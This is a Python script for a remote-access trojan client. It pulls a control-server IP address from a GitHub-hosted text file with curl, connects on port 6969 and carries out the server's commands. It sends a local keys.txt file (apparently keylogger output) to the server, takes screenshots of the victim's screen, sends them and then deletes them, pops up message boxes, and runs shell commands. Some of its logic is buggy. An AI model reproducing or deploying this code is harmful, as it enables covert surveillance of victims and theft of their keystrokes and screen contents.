import socket
import time
import pickle
import os
import imageio as io
from PIL import ImageGrab
from tkinter import *
from tkinter import messagebox
h=1
def cleanup():
    cmd="" 
    p=0
    l=0
    k=0
    s2=""
    msg=""
    argt1=""
    argt2=""
    fnum=""
    txt_path=""
    imgfn="scrn"
    arg=""
cwd=os.getcwd()
while(h==1):
    cmd="" 
    p=0
    l=0
    k=0
    a=0
    s2=""
    msg=""
    argt1=""
    argt2=""
    fnum=""
    imgfn="scrn"
    addr2=""
    addr1=os.popen("curl https://raw.githubusercontent.com/txt-sys/txt/refs/heads/main/ip.txt").read()
    f=len(addr1) -1
    for n in addr1:
        if a==f:
            break
        addr2+=n
        a+=1
    # Set a timeout so the socket does not block
    # indefinitely when trying to receive data.
    x=0
    c =socket.socket()
    c.connect((addr1, 6969))
    while True:
        arg=c.recv(1024).decode()               
        if (arg[0]=='4'):
            txt_path=cwd+"\\keys.txt"
            file = open(txt_path, 'rb')
            line = file.read(1024)
            while(line):
                print("1")
                c.send(line)
                line = file.read(1024)
                c.close()   
                file.close()
                cleanup()
                break
        elif(arg[0]=='5'):
            for n in arg:
                k+=1
                if k>=2:
                    msg+=n                                         
            messagebox.showinfo("showinfo", msg)
            cleanup()
            break
        elif(arg[0]=='6'):
            for n in arg:
                if n==' ':
                    k+=1
                if k==1:
                    argt1+=n
                if k==2:
                    argt2+=n
            argtn1=int(argt1)
            argtn2=int(argt2)
            for b in range(argtn1):
                fnum=""
                name=""
                del_cmd="del "
                save_path=cwd+"\\"
                name+=imgfn
                fnum+=str(b)
                name+=fnum
                name+=".jpeg"
                snapshot = ImageGrab.grab()
                save_path +=name
                print(save_path)
                snapshot.save(save_path)
                fl= open(save_path, "rb") 
                data = fl.read() 
                while data:
                    c.send(data) 
                    data = fl.read()
                    # File is closed after data is sent 
                fl.close()
                    # File is closed after data is sent 
                del_cmd+=save_path
                os.system(del_cmd)
                time.sleep(5)
            c.close()
            cleanup()
            break
        elif((arg[0]!='4')and(arg[0]!='5')and(arg[0]!='6')) and (arg[0]!='E'):
            cmd+=cwd
            cmd+="n "
            os.system(cmd)
            cleanup()
            break
        if arg[0]=='E':
            c.close()
            exit()
            break
            cleanup()
        